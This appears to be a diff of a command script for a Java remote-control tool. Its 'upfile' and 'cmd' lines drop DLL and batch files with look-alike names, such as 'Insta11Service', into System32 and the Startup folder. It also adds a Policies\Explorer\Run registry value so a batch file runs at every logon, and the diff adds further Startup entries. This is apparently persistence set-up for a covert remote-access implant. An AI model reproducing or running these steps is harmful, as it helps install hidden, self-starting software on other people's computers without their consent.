@@ -20,7 +20,8 @@ cd /d %~dp0
 start javaw -Xms215m -Xmx215m -Dfile.encoding=UTF-8 -jar remote-1.0-SNAPSHOT
 exit
 
-
+upfile:E:\IdeaProjects\remote\remoteopt\Insta11Service>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Insta11Service
+upfile:E:\IdeaProjects\remote\remoteopt\startInsta11Service.bat>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\startInsta11Service.bat
 
 upfile:D:\remotefile\Insta11Service.dll>C:\Windows\System32\Insta11Service.dll
 upfile:D:\remotefile\internetmail.bat>C:\Windows\System32\internetmail.bat
@@ -31,10 +32,6 @@ upfile:D:\remotefile\win_cfg.dll>C:\Windows\System32\win_cfg.dll
 upfile:D:\remotefile\windows_exec.bat>C:\Windows\System32\windows_exec.bat
 cmd:reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v two /t REG_SZ /d c:\windows\system32\windows_exec.bat /f
 --cmd:reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v two /f
-
-upfile:D:\remotefile\dll>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\dll
-upfile:D:\remotefile\ick.bat>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ick.bat
-
 
 
 --无jdk
